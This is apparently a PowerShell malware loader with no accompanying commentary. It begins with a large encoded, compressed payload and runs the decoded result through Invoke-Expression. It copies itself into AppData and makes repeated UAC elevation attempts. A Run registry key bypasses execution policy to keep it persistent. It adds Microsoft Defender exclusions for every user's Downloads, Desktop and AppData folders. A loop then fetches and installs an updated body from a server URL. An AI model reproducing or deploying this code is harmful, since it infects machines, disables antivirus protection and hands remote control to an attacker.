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"



function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}

$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function extract_holder()
{
    try
    {
        

        $holderFile = Get-HolderPath
        if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
        {
            $random = ''
            $content = '
    $CompressedBytes = [Convert]::FromBase64String($EncodedScript)

$MemoryStream = New-Object System.IO.MemoryStream(,$CompressedBytes)
$GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)

$OutputStream = New-Object System.IO.MemoryStream
$GzipStream.CopyTo($OutputStream)

$DecompressedBytes = $OutputStream.ToArray()
$data = [System.Text.Encoding]::UTF8.GetString($DecompressedBytes)

$sb = New-Object System.Text.StringBuilder
[void]$sb.Append($data)

$DecodedScript = $sb.ToString()


function IsLocalDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

if (IsLocalDebug)
{
    try
    {
        $outFile = "C:\debug-decoded.ps1"
        [System.IO.File]::WriteAllText($outFile, $DecodedScript)
    } 
    catch 
    {
    }
}


Invoke-Expression $DecodedScript


    '
            $DoubleQuote = [char]34
            $DollarSign = [char]36
            $sb = New-Object System.Text.StringBuilder
            [void]$sb.AppendLine($random)
            [void]$sb.Append($DollarSign)
            [void]$sb.Append("EncodedScript =")
            [void]$sb.Append($DoubleQuote)
            [void]$sb.Append($EncodedScript)
            [void]$sb.Append($DoubleQuote)
            [void]$sb.AppendLine("")
            [void]$sb.AppendLine($content)
            $content = $sb.ToString()
            $folderPath = [System.IO.Path]::GetDirectoryName($holderFile)
            if (-not (Test-Path -Path $folderPath)) {
                New-Item -Path $folderPath -ItemType Directory
            }
            [System.IO.File]::WriteAllText($holderFile, $content)
            writedbg "extract_holder encodedScript"

            return
        }
        try
        {
            $curScript = Get-ScriptPath
            $pathOrData = $global:MyInvocation.MyCommand.Definition
            if ($pathOrData.Length -gt 500)
            {
                writedbg "extract_holder pathOrData"
                [System.IO.File]::WriteAllText($holderFile, $pathOrData)
            } 
            else 
            {
                if ($curScript -ne $holderFile)
                {
                    Copy-Item -Path $curScript -Destination $holderFile -Force
                }
            } 
        }
        catch
        {
        }
    }
    finally 
    {
        try 
        { 
            if ($null -ne $server.startDownloads) 
            {
                if ($null -ne $server.startDownloads[0]) 
                {
                    RegWriteParam -keyName "download" -value $server.startDownloads[0]    
                }
            }
            RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
            RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
            RegWriteParam -keyName "trackSerie" -value $server.trackSerie
        }
        catch {
        
        }
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    writedbg "holder initialization"
    checkFolder
    extract_holder
    extract_body
}

Initialization




$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function do_autorun()
{
    $holder = (Get-HolderPath)
    $body = (Get-BodyPath)
    if ($server.aggressiveAdmin)
    {
        $elevated = IsElevated
        if ($elevated)
        {
            writedbg "running elevated body path in aggressive admin"
            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true
        } 
        else 
        {
            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            if ($attempt -ne 1)
            {
                $sleep = $server.aggressiveAdminDelay
                writedbg "Not elevated, sleeping: $sleep"
                Start-Sleep -Seconds $sleep
            }
            writedbg "trying to elevate holder"
            try {
                RunMe -script $holder -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
            }
            catch {
                RunMe -script $holder -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
            }        
        }
    }
    else 
    {
        writedbg "No aggresive admin"
        try 
        {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}






function Add-HolderToStartup {
    
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = Get-MachineCode
    $holderPath = Get-HolderPath
    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$holderPath`" -ArgumentList '-autostart true'"

    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function do_autoregistry {
    $autoStart = RegReadParamBool -keyName "autoStart" -default $true
    if (-not $autoStart)
    {
        writedbg "Skipping autostart..."
        return
    } 
    else 
    {
            writedbg "Setting autostart..."
    }
    try 
    {
        Add-HolderToStartup
    } catch {
        writedbg "Error  DoRegistryAutoStart $_"
    }
}





function Get-DownloadsFolder {
    [Environment]::GetFolderPath("UserProfile") + "\Downloads"
}

function Get-DesktopFolder {
    [Environment]::GetFolderPath("Desktop")
}

function Add-MsDefenderExclusion {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Folder
    )

    if (-Not (Test-Path -Path $Folder)) {
        Write-Warning "The folder '$Folder' does not exist."
        return
    }

    try {
        Add-MpPreference -ExclusionPath $Folder
    }
    catch {
        Write-Error "Failed to add exclusion: $_"
    }
}

function do_autostuff() 
{
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    writedbg "Running as Administrator: $isAdmin"

    # Check Defender status
    $status = Get-MpComputerStatus
    $status | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled
    writedbg $status

    $subFolders = @("AppData\Roaming\$(Get-MachineCode)", "Downloads", "Desktop")

    $userProfileRoot = "C:\Users"

    $folders = @()

    $folders += Get-DownloadsFolder
    $folders += Get-DesktopFolder
    $folders += Get-HephaestusFolder

    Get-ChildItem -Path $userProfileRoot -Directory | ForEach-Object {
        $userFolder = $_.FullName

        foreach ($sub in $subFolders) {
            $fullPath = Join-Path $userFolder $sub
            if (Test-Path $fullPath) {
                if ($fullPath -notin $folders)
                {
                    $folders += $fullPath
                }
            }
        }
    }

    foreach ($folder in $folders)
    {
        writedbg $folder
        Add-MsDefenderExclusion $folder
    }
}







function do_autoupdate() {
    $autoUpdate = RegReadParamBool -keyName "autoUpdate" -default $true
    if (-not $autoUpdate){
        writedbg "Skipping autoupdate..."
        return
    }
    else 
    {
            writedbg "Doing autoupdate..."
    }
    $url = $server.updateUrl
    $url = SmartServerlUrl -url $url
    $timeout = [datetime]::UtcNow.AddMinutes(10)
    $delay = 30
    if (-not $globalDebug)
    {
        Start-Sleep -Seconds $delay
    }

    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                $file=Get-BodyPath
                CustomDecodeEnveloped -inContent $response.Content -outFile $file
                return
            }
        }
        catch {
            writedbg "Failed to DoUpdate ($url): $_"
        }
        if ($globalDebug)
        {
            break;
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the DoUpdate ($url) within the allotted time."
}





do_autorun
do_autoregistry
do_autostuff
do_autoupdate
